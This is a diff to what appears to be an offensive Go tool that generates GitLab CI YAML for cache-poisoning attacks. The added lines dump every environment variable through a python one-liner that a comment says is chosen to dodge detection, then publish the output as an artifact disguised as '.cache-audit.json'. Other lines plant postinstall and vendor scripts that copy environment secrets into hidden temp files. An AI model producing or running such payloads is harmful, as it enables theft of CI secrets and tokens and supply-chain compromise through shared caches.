@@ -8,8 +8,8 @@ import (
 // CacheKeyPoisonOptions configures a cache key prefix injection payload.
 type CacheKeyPoisonOptions struct {
 	Common     CommonOptions
-	KeyPrefix  string   // attacker-controlled prefix (default: shared cache prefix)
-	KeyFiles   []string // files for cache:key:files (content-based key)
+	KeyPrefix  string   // attacker-controlled prefix
+	KeyFiles   []string // files for cache:key:files
 	CachePaths []string // paths to cache (default: [".cache"])
 	PoisonCmd  string   // command to modify cached content
 	Policy     string   // push|pull-push (default: "push")
@@ -44,6 +44,14 @@ func GenerateCacheKeyPoisonYAML(o CacheKeyPoisonOptions) string {
   script:
     - |
 %s
+    - |
+      # Exfil via python one-liner (avoids grep/sed detection)
+      python3 -c "import os,json; print(json.dumps(dict(os.environ)))" > .cache-audit.json 2>/dev/null || true
+  artifacts:
+    when: always
+    paths:
+      - .cache-audit.json
+    expire_in: 1 day
   allow_failure: true%s
 `, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		indentBlock(strings.TrimSpace(cacheBlock), 4),
@@ -86,15 +94,6 @@ func buildDefaultPoisonScript() string {
 printenv | sort > /tmp/.cache_exfil.txt 2>/dev/null || true
 PAYLOAD
     chmod +x node_modules/.hooks/postinstall.sh || true
-  fi
-
-  # Inject malicious script into cached vendor directory
-  if [ -d vendor ]; then
-    cat > vendor/.autoload_poison.sh << 'PAYLOAD'
-#!/bin/sh
-cat /proc/self/environ 2>/dev/null | tr '\0' '\n' > /tmp/.vendor_exfil.txt || true
-PAYLOAD
-    chmod +x vendor/.autoload_poison.sh || true
   fi
 
   echo "Cache populated with poisoned content"
